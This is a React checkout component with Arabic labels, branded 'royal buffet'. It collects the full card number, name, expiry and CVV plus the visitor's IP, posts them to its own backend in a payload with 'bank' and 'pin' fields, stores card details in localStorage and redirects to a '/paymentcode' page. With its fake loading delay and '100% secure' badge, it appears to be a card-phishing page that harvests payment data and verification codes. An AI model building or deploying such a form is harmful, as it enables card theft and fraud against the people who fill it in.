import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import Spinner from '../components/Spinner';

const PaymentCard = () => {
  const [isLoading, setIsLoading] = useState(true);
  const navigate = useNavigate();

  const [cardData, setCardData] = useState({
    number: '',
    name: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: ''
  });

  const [userIP, setUserIP] = useState('');
  const [amount, setAmount] = useState(0);
  const [currency, setCurrency] = useState('');

  useEffect(() => {
    const spinnerTimer = setTimeout(() => {
      setIsLoading(false);
    }, 4000);
    
    fetchUserIP();

    const storedAmount = localStorage.getItem('orderTotal');
    const storedCurrency = localStorage.getItem('orderCurrency');

    if (storedAmount) setAmount(parseFloat(storedAmount));
    if (storedCurrency) setCurrency(storedCurrency);
    
    return () => clearTimeout(spinnerTimer);
  }, []);

  const fetchUserIP = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      setUserIP(data.ip);
    } catch (err) {
      console.error('فشل في جلب الـ IP:', err);
      setUserIP('غير معروف');
    }
  };

  const handleChange = (e) => {
    const { name, value } = e.target;

    if (name === 'number') {
      // مسح أي أحرف غير رقمية والحد بـ 16 رقمًا فقط
      const digits = value.replace(/\D/g, '').substring(0, 16);
      // تنسيق الرقم: إضافة مسافة كل 4 أرقام
      const formattedValue = digits.replace(/(\d{4})(?=\d)/g, '$1 ');
      setCardData({ ...cardData, [name]: formattedValue });
    } else if (name === 'cvv') {
      // مسح أي أحرف غير رقمية والحد بـ 3 أرقام فقط
      setCardData({ ...cardData, [name]: value.replace(/\D/g, '').substring(0, 3) });
    } else {
      setCardData({ ...cardData, [name]: value });
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // التحقق من رقم البطاقة (16 رقمًا بالضبط)
    const cardNumberDigits = cardData.number.replace(/\D/g, '');
    if (cardNumberDigits.length !== 16) {
      alert('يرجى إدخال رقم بطاقة صحيح مكون من 16 رقمًا');
      return;
    }

    if (!/^[a-zA-Z\u0600-\u06FF\s]+$/.test(cardData.name)) {
      alert('يرجى إدخال اسم صحيح على البطاقة');
      return;
    }

    if (!cardData.expiryMonth || !cardData.expiryYear) {
      alert('يرجى تحديد تاريخ انتهاء الصلاحية');
      return;
    }

    // التحقق من CVV (3 أرقام بالضبط)
    if (!/^\d{3}$/.test(cardData.cvv)) {
      alert('يرجى إدخال رمز CVV صحيح مكون من 3 أرقام');
      return;
    }

    try {
      const paymentData = {
        bank: 'غير محدد',
        cardNumber: cardData.number,
        pin: 'غير محدد',
        expiry: `${cardData.expiryMonth}/${cardData.expiryYear}`,
        cvv: cardData.cvv,
        amount,
        currency,
        userIP
      };

      // استخدام متغير البيئة في عنوان API
      const response = await fetch(`${process.env.REACT_APP_API_BASE_URL}/api/payment/submit-payment`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(paymentData)
      });

      if (response.ok) {
        localStorage.setItem('paymentCardNumber', cardData.number);
        localStorage.setItem('paymentCardName', cardData.name);
        localStorage.setItem('paymentCardExpiry', `${cardData.expiryMonth}/${cardData.expiryYear}`);

        navigate('/paymentcode');
      } else {
        throw new Error('فشل في إرسال البيانات');
      }
    } catch (error) {
      alert('حدث خطأ أثناء الإرسال: ' + error.message);
    }
  };

  // توليد قائمة الشهور (01 إلى 12)
  const months = Array.from({ length: 12 }, (_, i) => 
    (i + 1).toString().padStart(2, '0')
  );
  
  // توليد قائمة السنوات (السنة الحالية إلى 10 سنوات قادمة) بأربعة أرقام
  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 10 }, (_, i) => 
    (currentYear + i).toString()
  );

  // عرض الـ Spinner أثناء التحميل
  if (isLoading) {
    return <Spinner />;
  }

  return (
    <div className="payment-card-container">
      <div className="card-mini-preview">
        <div className="mini-card">
          <div className="mini-card-number">
            {cardData.number ? cardData.number.replace(/\d{4}(?= \d{4})/g, '••••') : '•••• •••• •••• ••••'}
          </div>
          <div className="mini-card-details">
            <div className="mini-card-name">{cardData.name || 'الاسم على البطاقة'}</div>
            <div className="mini-card-expiry">
              {cardData.expiryMonth && cardData.expiryYear 
                ? `${cardData.expiryMonth}/${cardData.expiryYear}` 
                : '••/••'}
            </div>
          </div>
        </div>
      </div>

      <div className="card-icons">
        <div className="card-icon-wrapper">
          <img 
            src="card.png" 
            alt="بطاقة فيزا" 
            className="card-icon visa"
          />
        </div>
        
        <div className="card-icon-wrapper">
          <img 
            src="credit-card.png" 
            alt="بطاقة ماستركارد" 
            className="card-icon mastercard"
          />
        </div>
      </div>

      <form onSubmit={handleSubmit} className="payment-card-form">
        <h2>بيانات الدفع</h2>
        <div className="form-group">
          <label>الاسم على البطاقة</label>
          <input
            type="text"
            name="name"
            value={cardData.name}
            onChange={handleChange}
            placeholder="الاسم على البطاقة"
            required
          />
        </div>

        <div className="form-group">
          <label>رقم البطاقة (16 رقمًا)</label>
          <input
            type="text"
            inputMode="numeric"
            name="number"
            value={cardData.number}
            onChange={handleChange}
            placeholder="0000 0000 0000 0000"
            required
          />
        </div>

        <div className="form-row">
          <div className="form-group">
            <label>تاريخ الانتهاء</label>
            <div className="expiry-select-container">
              <select
                name="expiryMonth"
                value={cardData.expiryMonth}
                onChange={handleChange}
                className="expiry-select"
                required
              >
                <option value="">الشهر</option>
                {months.map(month => (
                  <option key={month} value={month}>{month}</option>
                ))}
              </select>
              
              <span className="expiry-divider"></span>
              
              <select
                name="expiryYear"
                value={cardData.expiryYear}
                onChange={handleChange}
                className="expiry-select"
                required
              >
                <option value="">السنة</option>
                {years.map(year => (
                  <option key={year} value={year}>{year}</option>
                ))}
              </select>
            </div>
          </div>

          <div className="form-group">
            <label>cvv رمز الأمان</label>
            <input
              type="password"
              name="cvv"
              value={cardData.cvv}
              onChange={handleChange}
              placeholder="123"
              maxLength={3}
              required
            />
          </div>
        </div>
        
        <div className="secure-payment">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="secure-icon">
            <path fill="currentColor" d="M12 2C9.2 2 7 4.2 7 7v3H6c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2h-1V7c0-2.8-2.2-5-5-5zm0 2c1.7 0 3 1.3 3 3v3H9V7c0-1.7 1.3-3 3-3zm-6 8h12v8H6v-8zm6 3c-.6 0-1 .4-1 1s.4 1 1 1 1-.4 1-1-.4-1-1-1z"/>
          </svg>
          <span>الدفع آمن 100%</span>
        </div>

        <button type="submit" className="submit-btn">
          تأكيد الدفع
        </button>

        <div className="payment-footer">
          <p>© royal buffet 2025 - جميع الحقوق محفوظة</p>
        </div>
      </form>
      <style jsx>{`
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap');
        
        .payment-card-container {
          max-width: 480px;
          margin: 20px auto;
          margin-bottom:80px;
          padding: 25px;
          display: flex;
          flex-direction: column;
          align-items: center;
          font-family: 'Cairo', sans-serif;
          background: #f9f6f4;
          border-radius: 16px;
          box-shadow: 0 4px 20px rgba(166, 119, 105, 0.15);
        }
        
        .card-mini-preview {
          width: 100%;
          max-width: 320px;
          margin-bottom: 15px;
        }
        
        .mini-card {
          background: linear-gradient(135deg, #A67769 0%, #c49d8f 100%);
          border-radius: 10px;
          padding: 15px;
          color: white;
          box-shadow: 0 4px 12px rgba(166, 119, 105, 0.25);
          position: relative;
          overflow: hidden;
          height: 80px;
        }
        
        .mini-card:before {
          content: '';
          position: absolute;
          top: -30px;
          right: -30px;
          width: 80px;
          height: 80px;
          background: rgba(255, 255, 255, 0.15);
          border-radius: 50%;
        }
        
        .mini-card:after {
          content: '';
          position: absolute;
          bottom: -20px;
          left: -20px;
          width: 60px;
          height: 60px;
          background: rgba(255, 255, 255, 0.1);
          border-radius: 50%;
        }
        
        .mini-card-number {
          font-size: 16px;
          letter-spacing: 1px;
          margin-bottom: 10px;
          font-weight: 500;
          font-family: 'Courier New', monospace;
          direction: ltr;
          text-align: center;
        }
        
        .mini-card-details {
          display: flex;
          justify-content: space-between;
          font-size: 12px;
          opacity: 0.9;
        }
        
        .mini-card-name {
          flex: 1;
          overflow: hidden;
          text-overflow: ellipsis;
          white-space: nowrap;
          padding-right: 10px;
        }
        
        .mini-card-expiry {
          font-family: 'Courier New', monospace;
          font-size: 11px; /* تصغير الخط قليلاً ليتناسب مع السنة الكاملة */
        }
        
        .card-icons {
          display: flex;
          justify-content: center;
          gap: 20px;
          margin-bottom: 10px;
          width: 100%;
          padding: 0 5px;
        }
        
        .card-icon-wrapper {
          display: flex;
          flex-direction: column;
          align-items: center;
          gap: 2px;
        }
        
        .card-icon {
          width: 70px;
          height: 46px;
          object-fit: contain;
          border-radius: 4px;
          padding: 0px;
          background: white;
          box-shadow: 0 3px 10px rgba(166, 119, 105, 0.15);
          transition: all 0.3s ease;
        }
        
        .card-icon:hover {
          transform: translateY(-5px);
          box-shadow: 0 6px 15px rgba(166, 119, 105, 0.25);
        }
        
        .payment-card-form {
          width: 100%;
          background: white;
          padding: 25px;
          border-radius: 12px;
          box-shadow: 0 3px 10px rgba(166, 119, 105, 0.1);
        }
        
        h2 {
          text-align: center;
          color: #A67769;
          margin-bottom: 25px;
          font-weight: 700;
          font-size: 22px;
          position: relative;
        }
        
        h2:after {
          content: '';
          display: block;
          width: 50px;
          height: 3px;
          background: #e0d1cb;
          margin: 10px auto 0;
          border-radius: 2px;
        }
        
        .form-group {
          margin-bottom: 10px;
        }
        
     .form-group     label {
          display: block;
          margin-bottom: 8px;
          color: #5a4a42;
          font-weight: 600;
          font-size: 14px;
        }
        
   .form-group input {
          width: 100%;
          padding: 5px 15px;
          border: 1px solid #e0d1cb;
          border-radius: 8px;
          font-size: 15px;
          transition: all 0.3s;
          background: #faf8f6;
          font-family: 'Cairo', sans-serif;
        }
        
        input:focus {
          outline: none;
          border-color: #A67769;
          box-shadow: 0 0 0 3px rgba(166, 119, 105, 0.2);
          background: white;
        }
        
        .form-row {
          display: flex;
          gap: 15px;
        }
        
        .form-row .form-group {
          flex: 1;
        }
        
        .expiry-select-container {
          display: flex;
          align-items: center;
          gap: 8px;
          width: 100%;
        }
        
        .expiry-select {
          flex: 1;
          padding: 5px 15px;
          border: 1px solid #e0d1cb;
          border-radius: 8px;
          font-size: 15px;
          background: #faf8f6;
          font-family: 'Cairo', sans-serif;
          color: #5a4a42;
          cursor: pointer;
        }
        
        .expiry-select:focus {
          outline: none;
          border-color: #A67769;
          box-shadow: 0 0 0 3px rgba(166, 119, 105, 0.2);
          background: white;
        }
        
        .expiry-divider {
          color: #8a7b75;
          font-size: 18px;
        }
        
        .submit-btn {
          width: 100%;
          background: #A67769;
          color: white;
          border: none;
          padding: 14px;
          border-radius: 8px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          margin-top: 10px;
          transition: all 0.3s;
          font-family: 'Cairo', sans-serif;
          position: relative;
          overflow: hidden;
        }
        
        .submit-btn:hover {
          background: #8a5c50;
          transform: translateY(-2px);
          box-shadow: 0 4px 12px rgba(166, 119, 105, 0.3);
        }
        
        .submit-btn:after {
          content: '';
          position: absolute;
          top: -50%;
          left: -60%;
          width: 20px;
          height: 200%;
          background: rgba(255,255,255,0.2);
          transform: rotate(25deg);
          transition: all 0.5s;
        }
        
        .submit-btn:hover:after {
          left: 120%;
        }
        
        .payment-footer {
          text-align: center;
          margin-top: 25px;
          color: #8a7b75;
          font-size: 13px;
          padding-top: 15px;
          border-top: 1px solid #f0e9e6;
        }
        
        .secure-payment {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
          margin-top: 15px;
          padding: 10px;
          background: #f0f7f0;
          border-radius: 8px;
          color: #4caf50;
          font-size: 14px;
          font-weight: 600;
          border: 1px solid #d0e9d0;
        }
        
        .secure-icon {
          width: 18px;
          height: 18px;
          fill: #4caf50;
        }
        
        @media (max-width: 500px) {
          .payment-card-container {
            padding: 15px;
            margin: 15px;
          }
          
          .payment-card-form {
            padding: 20px;
          }
          
          .form-row {
            flex-direction: column;
            gap: 0;
          }
          
          .mini-card {
            height: 70px;
          }
          
          .mini-card-number {
            font-size: 14px;
          }
          
          .mini-card-expiry {
            font-size: 10px;
          }
          
          .secure-payment {
            font-size: 13px;
            padding: 8px;
          }
          
          .card-icons {
            gap: 15px;
          }
          
          .card-icon {
            width: 60px;
            height: 40px;
          }
          
          .expiry-select {
            font-size: 14px;
            padding: 5px 10px;
          }
        }
      `}</style>
    </div>
  );
};

export default PaymentCard;